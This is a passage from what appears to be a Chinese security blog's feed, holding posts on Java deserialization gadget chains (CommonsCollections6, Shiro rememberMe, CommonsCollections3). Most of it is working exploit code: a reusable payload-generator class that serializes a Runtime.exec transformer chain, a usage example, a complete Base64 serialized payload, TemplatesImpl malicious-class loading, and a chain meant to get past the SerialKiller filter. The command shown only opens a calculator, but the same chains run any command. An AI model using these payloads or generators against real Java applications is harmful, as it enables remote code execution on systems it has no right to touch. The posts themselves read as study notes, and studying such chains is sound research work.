==================</span></span><br><span class="line">        <span class="comment">// 生成序列化字符串</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> barr.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码前后的部分都很熟悉<br>但是中间的部分看着很奇怪<br>不妨把之前的代码贴上对比一下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CC6</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// 弹出计算器（Windows）</span></span><br><span class="line">    )</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 2: 创建LazyMap并关联Transformer链</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 3: 将LazyMap封装到TiedMapEntry中</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 4: 将TiedMapEntry放入HashMap以触发反序列化链</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap.put(entry, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 5: 移除LazyMap中的缓存，确保反序列化时触发链</span></span><br><span class="line">lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="不同点1：翻译链变成翻译器了"><a href="#不同点1：翻译链变成翻译器了" class="headerlink" title="不同点1：翻译链变成翻译器了"></a>不同点1：翻译链变成翻译器了</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>没有常量翻译器了我们怎么返回需要的类？</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>原来是<code>Lazymap</code>的<code>get</code>方法会自己触发翻译<br>也就是说此时key作为恶意类进入翻译器就可以省去常量翻译器了</p><p>需要进行改动的原因：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这里仅给出最后的结论：如果反序列化流中包含非Java自身的数组，则会出现无法加载类的错误。这就</span><br><span class="line">解释了为什么CommonsCollections6无法利用了，因为其中用到了Transformer数组。</span><br></pre></td></tr></table></figure><h3 id="不同点2：lazymap清除缓存的另一种写法"><a href="#不同点2：lazymap清除缓存的另一种写法" class="headerlink" title="不同点2：lazymap清除缓存的另一种写法"></a>不同点2：lazymap清除缓存的另一种写法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CC6</span></span><br><span class="line">lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里写作：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">outerMap.clear();</span><br></pre></td></tr></table></figure><p>事实上是一样的效果<br>如此一来就可以通过更改cookie的方式触发恶意的反序列化操作<br>弹出计算器了</p><p><img src="/2025/04/18/java-shiro/shiro1.png" alt="alt text"><br>需要注意清除session否则会话过期之前<br>rememberme的部分不会被反序列化</p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化payload生成器（持续更新）</title>
      <link href="/2025/04/06/java-payload/"/>
      <url>/2025/04/06/java-payload/</url>
      
        <content type="html"><![CDATA[<p>利用<code>lazymap</code>将翻译器链转换为可反序列化触发的<code>payload</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TurnChainToPayload</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">TurnChainToPayload</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TurnChainToPayload</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">TurnChainToPayload</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TurnChainToPayload <span class="title function_">getInstance</span><span class="params">()</span> &#123; <span class="comment">// 提供公共访问方法</span></span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getPayload</span><span class="params">(ChainedTransformer chain)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> turnChainToMap(chain);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> turnMapToSerialize(hashMap);</span><br><span class="line">        System.out.println(<span class="string">&quot;Base64：\n&quot;</span>+ Base64.getEncoder().encodeToString(bos.toByteArray()));</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Hex：\n&quot;</span> + bytesToHex(bos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> HashMap <span class="title function_">turnChainToMap</span><span class="params">(ChainedTransformer chain)</span>&#123;</span><br><span class="line">        <span class="comment">// Step 2: 创建LazyMap并关联Transformer链</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br><span class="line">        <span class="comment">//lazyMap.get(&quot;ciallo&quot;);</span></span><br><span class="line">        <span class="comment">// Step 3: 将LazyMap封装到TiedMapEntry中</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="comment">//entry.hashCode();</span></span><br><span class="line">        <span class="comment">// Step 4: 将TiedMapEntry放入HashMap以触发反序列化链</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(entry, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line">        <span class="comment">// Step 5: 移除LazyMap中的缓存，确保反序列化时触发链</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ByteArrayOutputStream <span class="title function_">turnMapToSerialize</span><span class="params">(HashMap hashMap)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">//System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));</span></span><br><span class="line">        <span class="keyword">return</span> bos;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">bytesToHex</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : bytes) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> Integer.toHexString(<span class="number">0xff</span> &amp; b);</span><br><span class="line">            <span class="keyword">if</span> (hex.length() == <span class="number">1</span>) &#123;</span><br><span class="line">                hexString.append(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            hexString.append(hex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexString.toString().toUpperCase();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用例：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// 弹出计算器（Windows）</span></span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TurnChainToPayload</span> <span class="variable">turner</span> <span class="operator">=</span> TurnChainToPayload.getInstance();</span><br><span class="line">        turner.getPayload(chain);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Base64：</span><br><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADZm9vc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAEc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABtzcQB+ABN1cQB+ABgAAAACcHVxAH4AGAAAAAB0AAZpbnZva2V1cQB+ABsAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXEAfgAYAAAAAXQACGNhbGMuZXhldAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAADYmFyeA==</span><br><span class="line">---------------------</span><br><span class="line">Hex：</span><br><span class="linespan><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java链子分析—CommonsCollections3</title>
      <link href="/2025/04/06/java-cc3/"/>
      <url>/2025/04/06/java-cc3/</url>
      
        <content type="html"><![CDATA[<h3 id="利用TemplatesImpl的任意恶意类加载demo"><a href="#利用TemplatesImpl的任意恶意类加载demo" class="headerlink" title="利用TemplatesImpl的任意恶意类加载demo"></a>利用TemplatesImpl的任意恶意类加载demo</h3><p>上一篇中学习了利用<code>TemplatesImpl</code>加载类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;base64字节码&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123; code &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;NOT NULL&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>); <span class="comment">// 允许访问私有字段</span></span><br><span class="line">        field.set(obj, value);    <span class="comment">// 设置字段值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合之前生成恶意序列化数据的demo：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class</span><br><span class="line">                &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;</span><br><span class="line">                                <span class="string">&quot;calc&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//innerMap.put(&quot;value&quot;, &quot;xxxx&quot;);</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以把它们结合一下<br>这样就可以实现加载一个自定义的恶意类<br>执行任何代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span></span><br><span class="line">        com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollectionsIntro2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object</span></span><br><span class="line"><span class="params">            value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// source: bytecodes/HelloTemplateImpl.java</span></span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;base64字节码&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而在<code>SerialKiller</code>反序列化过滤器中<br>过滤了<code>InvokerTransformer</code><br>那么我们可以选用另外一个链子：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; obj &#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>尝试利用前面12篇文章学到的知识构造POC</p><h3 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h3><p>先来一个恶意类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> 